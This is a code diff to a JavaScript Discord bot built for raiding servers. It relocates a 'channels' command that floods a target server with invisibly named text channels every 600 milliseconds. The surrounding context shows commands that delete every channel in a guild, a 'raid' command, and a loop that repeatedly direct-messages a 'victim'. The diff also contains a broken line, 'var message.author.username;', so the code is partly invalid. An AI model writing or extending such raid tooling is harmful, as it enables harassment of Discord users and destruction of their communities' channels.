@@ -33,6 +33,17 @@ client.on('message', message => {
                 guild.channels.array()[i].delete();
             }
         }
+        
+        // Spam text channels
+        if (args[0] == prefix + 'channels') {
+            var serverid = args[1];
+            let guild = client.guilds.get(serverid);
+            var message.author.username;
+            var interval = setInterval(function () {
+                guild.createChannel("឵឵឵   ", { type: 'text' });
+            }, 600);
+        }
+        
         // raid serverid
         if (args[0] == prefix + 'raid') {
             var serverid = args[1];
@@ -66,16 +77,6 @@ client.on('message', message => {
                     victim.send(msg);
                 }, 600);
             });                
-        }
-        
-        // Spam text channels
-        if (args[0] == prefix + 'channels') {
-            var serverid = args[1];
-            let guild = client.guilds.get(serverid);
-            var message.author.username;
-            var interval = setInterval(function () {
-                guild.createChannel(name, "឵឵឵   ");
-            }, 600);
         }
         
         // Restart bot
